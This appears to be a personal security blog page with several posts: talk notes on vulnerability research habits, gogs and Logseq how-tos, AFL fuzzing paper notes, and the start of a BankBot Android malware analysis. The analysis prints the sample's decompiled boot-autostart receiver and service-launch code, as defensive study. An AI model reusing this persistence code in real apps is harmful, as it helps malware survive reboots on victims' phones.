          <p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon">https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon</a></p>
<ul>
<li>Temperament<ul>
<li>Curiosity</li>
<li>Detail-oriented</li>
<li>Ability to deal with failure and continual evidence that you’re wrong</li>
</ul>
</li>
<li>Learn how to deal with failure<ul>
<li>Two projects (can be unrealeted, or different parts of the same)<ul>
<li>Learn to recognize whe you have hit a wall and have become unproductive</li>
<li>Switch to your secondary project</li>
</ul>
</li>
<li>Consider having a development project as your seconary project<ul>
<li>Do an achiveable, measurable task</li>
<li>Regain a sense of achievement</li>
</ul>
</li>
</ul>
</li>
<li>Moving on - Knowning when to quit<ul>
<li>You will return it in the future</li>
</ul>
</li>
<li>Motivation - Remaining Enager<ul>
<li>The more you’re curious about how a technology works or how an algorithm achives its goal, the less monotonous code review is</li>
</ul>
</li>
<li>Motivation - bug patching<ul>
<li>bugs being patched is frustrating<ul>
<li>… but they are evidence that you were on the right track!</li>
</ul>
</li>
</ul>
</li>
<li>Confidence<ul>
<li>Research is a daunting filed to enter</li>
<li>Some security reseacher you respect had the same self-doubt coming in, and have recurrences from time to time</li>
<li>Growth mindset: “I can’t do that … Yet”</li>
</ul>
</li>
<li>Bias and assumptions<ul>
<li>Common code reviewer biases<ul>
<li>Everyone has looked at the already (many eyes make all bugs shallow)</li>
<li>Even if I found something, it will be unexploitable (Server side)</li>
<li>The X attack surface is not interesting now (eg, media parsing in browsers)</li>
<li>There are no more bugs in this</li>
<li>The protocol doesn’t allow you to do X</li>
</ul>
</li>
</ul>
</li>
<li>Auditing Process<ul>
<li>Understanding the code</li>
<li>Documenting your findings</li>
<li>Identifying bias</li>
<li>Tooling</li>
<li>Revisit the code base</li>
<li>Analyze failures</li>
</ul>
</li>
<li>Attampt to understand the code<ul>
<li>A lot of people try to short-circuit this process<ul>
<li>Reliance on tools</li>
<li>Fuzzers&#x2F;static analyzers are a guide, not the whole process</li>
</ul>
</li>
<li>Many of today’s vulnerabilities are complex, and require in-depth understanding of the codebase</li>
<li>The more you understand about how the program works, the better equipped you are to find bugs ( and exploit them)</li>
<li>The best way to understand how something works is to explain to someone else</li>
</ul>
</li>
<li>What I’m looking for<ul>
<li>software risk &#x3D; available attack surface * complexity</li>
<li>attack surface can be indirect<ul>
<li>even mitigations are attack surface</li>
</ul>
</li>
<li>often you initial perception of attack surface is naive<ul>
<li>Hidden&#x2F;non-obvious attack surfaces are the best</li>
</ul>
</li>
<li>Complexity is plentiful<ul>
<li>Feature driven (thanks w3c)</li>
<li>Legacy support</li>
<li>Often avoidable: the anomaly of cheap complexity</li>
</ul>
</li>
</ul>
</li>
<li>Borrwoing ideas<ul>
<li>Bugtracker &#x2F; Diffs<ul>
<li>Can show where a bug is</li>
<li>Can inspire new ideas: variants, same bugs in other codebase</li>
<li>Mean but viable: track commits by error-prone developers</li>
</ul>
</li>
<li>Comments in the codebase<ul>
<li>Descripbe things I’d never thought of</li>
</ul>
</li>
</ul>
</li>
<li>Document your findings<ul>
<li>Get into the habit of documenting<ul>
<li>ideas, bugs candidates, idiosyncrasies, data structure, algorithms</li>
</ul>
</li>
<li>Documenting failed ideas is as important as documenting successful ones<ul>
<li>avoids repeating thie idea sometime later</li>
</ul>
</li>
<li>Long term view: I’m going to revisit this later</li>
</ul>
</li>
<li>Revisit code bases and failed bugs<ul>
<li>code bases are not static<ul>
<li>coee rewritten</li>
<li>Features added&#x2F;changed</li>
</ul>
</li>
<li>Environment is not static</li>
</ul>
</li>
<li>Analyze your failures<ul>
<li>if someone succeeds where you didn’t, have a look at what they found</li>
<li>Try to figure out: why did I miss it?</li>
<li>Is this a one-off or teachable trick&#x2F;blind spot</li>
<li>Can you improve on that?</li>
<li>Is there a pattern in those falures?</li>
<li>Failures is an oppotunity to learn</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/04/13/gogs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/13/gogs/" class="post-title-link" itemprop="url">gogs 皮肤和源码升级</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-04-13 11:21:39" itemprop="dateCreated datePublished" datetime="2022-04-13T11:21:39+08:00">2022-04-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>gogs 使用了也有一年多了，小团队使用基本还行。有几个问题，第一界面代码 merge 有问题，第二不支持代码 review，<br>如果能解决上面两个问题就好用很多了。下面两段是年前折腾 gogs 的记录，没有啥技术含量，只是做个备份。</p>
<h2 id="切换皮肤"><a href="#切换皮肤" class="headerlink" title="切换皮肤"></a>切换皮肤</h2><p><a target="_blank" rel="noopener" href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> 提供了两款皮肤，文中给出的方法要修改 gogs 配置，直接使用 TamperMonkey 就可以了。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Gogs Theme</span></span><br><span class="line"><span class="comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span></span><br><span class="line"><span class="comment">// @namespace    http://tampermonkey.net/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  try to take over the world!</span></span><br><span class="line"><span class="comment">// @author       You</span></span><br><span class="line"><span class="comment">// @match        http://website:8000/*</span></span><br><span class="line"><span class="comment">// @grant        GM_getResourceText</span></span><br><span class="line"><span class="comment">// @grant        GM_addStyle</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="string">&#x27;use strict&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> my_css = <span class="title function_">GM_getResourceText</span>(<span class="string">&quot;IMPORTED_CSS&quot;</span>);</span><br><span class="line">    <span class="title function_">GM_addStyle</span>(my_css);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>使用后效果图</p>
<p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p>
<h2 id="源码升级"><a href="#源码升级" class="headerlink" title="源码升级"></a>源码升级</h2><p>gogs 已经有一年多没有提供二进制的安装包了，看了改进不少，就尝试了源码升级。<br>参考 <a target="_blank" rel="noopener" href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p>
<h3 id="安装-golang"><a href="#安装-golang" class="headerlink" title="安装 golang"></a>安装 golang</h3><p>参考 Google 官方文档，执行下面命令就可以了。 <a target="_blank" rel="noopener" href="https://go.dev/doc/install">https://go.dev/doc/install</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/local/go/bin</span><br></pre></td></tr></table></figure>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库到 &quot;gogs&quot; 子目录</span></span><br><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs</span><br><span class="line"><span class="comment"># 修改工作目录</span></span><br><span class="line"><span class="built_in">cd</span> gogs</span><br><span class="line"><span class="comment"># 编译主程序，这个步骤会下载所有依赖</span></span><br><span class="line">go build -o gogs</span><br></pre></td></tr></table></figure>

<p>编译过程会下载文件（需要自备梯子），编译完成后将在 gogs 工作目下生成 gogs 可执行文件</p>
<h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>gogs 源码的 Makefile 提供了打包命令，执行 <code>make pack</code> 即可，将在 release 目生成 <code>gogs.20220112095054.zip</code></p>
<h3 id="迁移配置"><a href="#迁移配置" class="headerlink" title="迁移配置"></a>迁移配置</h3><p>将 gogs.20220112095054.zip 解压，这就类似 gogs 的二进制升级了 <a target="_blank" rel="noopener" href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> gogs gogs_old</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/custom gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/data gogs</span><br><span class="line"><span class="built_in">cp</span> -R gogs_old/log gogs</span><br></pre></td></tr></table></figure>

<p>gogs 0.13 的配置已经发生了变化，如果不修改配置执行 <code>./gogs web</code>会出现错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2022/01/12 09:40:06 [ INFO] Gogs 0.13.0+dev</span><br><span class="line">2022/01/12 09:40:06 [FATAL] [...github/internal/route/install.go:75 GlobalInit()] Failed to initialize ORM engine:</span><br><span class="line">open database: failed to connect to `host=127.0.0.1 user=root database=gogs`: dial error (dial tcp 127.0.0.1:3306: connect: connection refused)</span><br></pre></td></tr></table></figure>

<p>看错误像是在连接 mysql 的 3306 端口，可是配置文件设置的是使用 sqlite，非常困惑。上网搜索后证实是 gogs 0.13 的配置文件的字段修改了。</p>
<p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p>
<p>最关键的两个字段是数据库相关的 <code>DB_TYPE</code> 改为 <code>TYPE</code>， <code>PASSWD</code> 改为 <code>PASSWORD</code> 修改后 <code>custom/conf/app.ini</code> 后，执行 <code>./gogs web</code> 一切正常。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/03/07/logseq2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/07/logseq2/" class="post-title-link" itemprop="url">Logseq 使用小结 （二）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-07 12:20:11" itemprop="dateCreated datePublished" datetime="2022-03-07T12:20:11+08:00">2022-03-07</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>用了 Logseq 一段时间了，做个简单的总结，国内的很多文章，在我看来还是不够简单明了, 本文大致介绍了 Logseq 比较常用的一些功能的使用。</p>
<h2 id="Flashcards"><a href="#Flashcards" class="headerlink" title="Flashcards"></a>Flashcards</h2><p>可以把记录的知识点当作卡片来记忆，用过 Anki 的同学，应该都比较熟悉了，使用的记忆算法为 <a target="_blank" rel="noopener" href="https://www.supermemo.com/en/archives1990-2015/english/ol/sm5">SM-5</a><br>要将一个 block 记为卡片非常简单，使用 <code>#card</code> 标签就可以了。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq5.png"></p>
<h3 id="卡片组"><a href="#卡片组" class="headerlink" title="卡片组"></a>卡片组</h3><p>有些卡片可能是归属同一个大类，这时候就可以使用卡片组了。像我上面这个例子中，要记忆的单词都在 <code>英语单词积累</code>下，就可以使用语法 <code>&#123;&#123;cards 英语单词积累&#125;&#125;</code> 效果如下图，<br>可以看出我已经积累了7张卡片了。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq6.png"></p>
<p>要背诵需要记忆的卡片时，单击左侧的 Flashcards 就可以了，使用方面没有什么特别的地方，有三个选项可以选择。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq7.png"></p>
<h2 id="theme-（皮肤）"><a href="#theme-（皮肤）" class="headerlink" title="theme （皮肤）"></a>theme （皮肤）</h2><p>皮肤就是青菜萝卜各有所爱了，推荐两款我自己比较喜欢的的皮肤。</p>
<p><img src="https://github.com/pengx17/logseq-laurel-theme/raw/master/white.png"><br><img src="https://raw.githubusercontent.com/tobealive/logseq-allday-theme/main/preview.png"></p>
<p>Github 仓库地址如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/pengx17/logseq-laurel-theme">https://github.com/pengx17/logseq-laurel-theme</a><br><a target="_blank" rel="noopener" href="https://github.com/tobealive/logseq-allday-theme">https://github.com/tobealive/logseq-allday-theme</a></p>
<p>有两种方法可以设置皮肤：</p>
<ul>
<li>custom.css</li>
<li>plugin system</li>
</ul>
<p>使用 custom.css，打开 Settings -&gt;     General -&gt;  Custom theme  点击 <code>custom.css</code> 复制 css 内容，保存退出即可。<br>使用插件系统，则需要先把插件系统打开，Settings  -&gt;  Advanced -&gt; Plug-in system 。打开插件系统后，可以直接使用<br>Plugins -&gt; Marketplace -&gt; themes 选择你喜欢的 theme 点击 <code>Install</code> 就可以了</p>
<p>不过还是推荐使用 Logseq 自带的插件管理系统来安装，可以自动升级比较方便，切换皮肤可以点击右上角 三个点 -&gt; Themes 选择皮肤。 </p>
<h2 id="plugin-（插件）"><a href="#plugin-（插件）" class="headerlink" title="plugin （插件）"></a>plugin （插件）</h2><p>使用 Logseq 插件同样是两种方法：</p>
<ul>
<li>plugin system</li>
<li>Load unpacked plugin</li>
</ul>
<p>使用插件系统的方法和上面安装皮肤的步骤大致相同，依次点击 Plugins -&gt; Marketplace -&gt; Plugins ，选择插件点击 <code>Install</code> 即可。要加载 <code>unpacked plugin</code> 首先要打开开发者模式 Settings  -&gt;  Advanced -&gt; Developer mode ,  设置为打开。打开后使用插件管理系统 Plugins -&gt; Installed -&gt; Load unpacked plugin 选择相关目录就可以了。</p>
<p>具体的插件可以参考 <a target="_blank" rel="noopener" href="https://github.com/logseq/awesome-logseq#Plugins">https://github.com/logseq/awesome-logseq#Plugins</a> 记录的插件都挺不错的。</p>
<p>值得一提的是，插件系统的网络不太稳定（总所周知的原因），使用代理会方便一些。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128</span><br></pre></td></tr></table></figure>

<p>安装插件可能会出现 timeout 错误，多重试几次就应该可以安装上了。</p>
<h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><p>query 算是 Logseq 的高级功能了，我用的也不多，输入 <code>/query</code> 回车就可以自动进入 query 了，具体的语法很灵活可以参考：<br><a target="_blank" rel="noopener" href="https://logseq.github.io/#/page/queries">https://logseq.github.io/#/page/queries</a></p>
<p>油管上有相关 video，大家可以参考一下：<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind</a></p>
<h2 id="写在后面的话"><a href="#写在后面的话" class="headerlink" title="写在后面的话"></a>写在后面的话</h2><p>Logseq 的功能还是挺多的，两篇文章也不可能全部介绍完，官方文档总是最好的资料：<a target="_blank" rel="noopener" href="https://logseq.github.io/#/page/Contents">https://logseq.github.io/#/page/Contents</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://logseq.github.io/">https://logseq.github.io</a><br><a target="_blank" rel="noopener" href="https://www.usmacd.com/2022/02/21/logseq/">https://www.usmacd.com/2022/02/21/logseq/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/03/04/afl-fuzz1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/04/afl-fuzz1/" class="post-title-link" itemprop="url">Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-04 10:14:45" itemprop="dateCreated datePublished" datetime="2022-03-04T10:14:45+08:00">2022-03-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>paper: <a target="_blank" rel="noopener" href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p>
<h2 id="两个实验的结论-主要基于-FuzzBench"><a href="#两个实验的结论-主要基于-FuzzBench" class="headerlink" title="两个实验的结论 (主要基于 FuzzBench)"></a>两个实验的结论 (主要基于 FuzzBench)</h2><ul>
<li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li>
<li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate – in isolation – the benefit of a different mechanism to decide if an input is interesting, as AFL’s novelty search provides a strong baseline.</li>
</ul>
<h2 id="论文中计划要评估的-afl-fuzz-的一些技术"><a href="#论文中计划要评估的-afl-fuzz-的一些技术" class="headerlink" title="论文中计划要评估的 afl-fuzz 的一些技术"></a>论文中计划要评估的 afl-fuzz 的一些技术</h2><ul>
<li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li>
<li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul>
<li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li>
<li>We expect the novelty search to outperforms both of the competing algorithms,</li>
</ul>
</li>
<li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul>
<li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li>
<li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li>
</ul>
</li>
<li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul>
<li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li>
</ul>
</li>
<li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul>
<li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li>
</ul>
</li>
<li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul>
<li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li>
</ul>
</li>
<li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul>
<li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li>
<li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li>
</ul>
</li>
<li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul>
<li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/02/22/BankBot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/22/BankBot/" class="post-title-link" itemprop="url">Bankbot APK 样本分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-22 13:35:06" itemprop="dateCreated datePublished" datetime="2022-02-22T13:35:06+08:00">2022-02-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x00-样本概况"><a href="#0x00-样本概况" class="headerlink" title="0x00 样本概况"></a>0x00 样本概况</h2><table>
<thead>
<tr>
<th>字段</th>
<th>内容</th>
</tr>
</thead>
<tbody><tr>
<td>样本名</td>
<td>BankBot</td>
</tr>
<tr>
<td>MD5</td>
<td>3c42c391bec405bb28b28195c2961778</td>
</tr>
<tr>
<td>SHA256</td>
<td>93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94</td>
</tr>
<tr>
<td>文件类型</td>
<td>APK</td>
</tr>
</tbody></table>
<p>这是一个以盗窃信用卡用户密码为主要目的的bot。安装后显示为Android图标。打开App后<br>会以Android系统更新的形式，诱导用户操作达到常驻系统的目的。</p>
<h2 id="0x01-行为分析"><a href="#0x01-行为分析" class="headerlink" title="0x01 行为分析"></a>0x01 行为分析</h2><h3 id="开机自启动"><a href="#开机自启动" class="headerlink" title="开机自启动"></a>开机自启动</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.android.market.Autorun&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;999&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Autorun</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.android.market;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Autorun</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Autorun</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(context, Scheduler.class);</span><br><span class="line">        v0.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">        context.startService(v0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>开机将启动 Schedule 服务</p>
